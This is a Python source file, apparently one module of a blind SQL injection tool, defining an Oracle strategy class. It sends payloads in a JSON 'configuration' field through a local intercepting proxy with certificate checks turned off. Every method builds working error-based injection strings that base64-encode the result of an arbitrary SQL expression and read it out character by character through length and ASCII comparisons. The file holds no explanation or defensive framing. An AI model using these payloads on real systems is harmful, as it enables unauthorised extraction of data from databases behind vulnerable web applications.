from strategies.abstract_strategy import AbstractStrategy
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class OracleStrategy(AbstractStrategy):
    def __init__(self, url):
        super().__init__()
        self.url = url
        self.session.proxies.update({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', })
        self.session.cookies.update({"test":"test"})
        self.session.headers.update({"test":"test"})
        self.session.verify = False

    def send_payload(self, payload, timeout=1):
        try:
            data = {
                "configuration": f"{payload}"
            }
            response = self.session.post(self.url, json=data, timeout=timeout)
            return response.status_code != 500
        except Exception as ex:
            return None
    
    def create_length_check_payload(self, cmd, length):
        normalized_b64 = f"REPLACE(REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(({cmd})))),CHR(13),''),CHR(10),'')"
        return f"' AND (SELECT 1/0 FROM DUAL WHERE LENGTH({normalized_b64})<{length})=1--"
    
    def create_char_check_payload(self, cmd, position, char_value):
        normalized_b64 = f"REPLACE(REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(({cmd})))),CHR(13),''),CHR(10),'')"
        return f"' AND (SELECT 1/0 FROM DUAL WHERE ASCII(SUBSTR({normalized_b64},{position+1},1))!={char_value})=1--"
    
    def create_char_less_than_payload(self, cmd, position, char_value):
        normalized_b64 = f"REPLACE(REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(({cmd})))),CHR(13),''),CHR(10),'')"
        return f"' AND (SELECT 1/0 FROM DUAL WHERE ASCII(SUBSTR({normalized_b64},{position+1},1))>{char_value})=1--"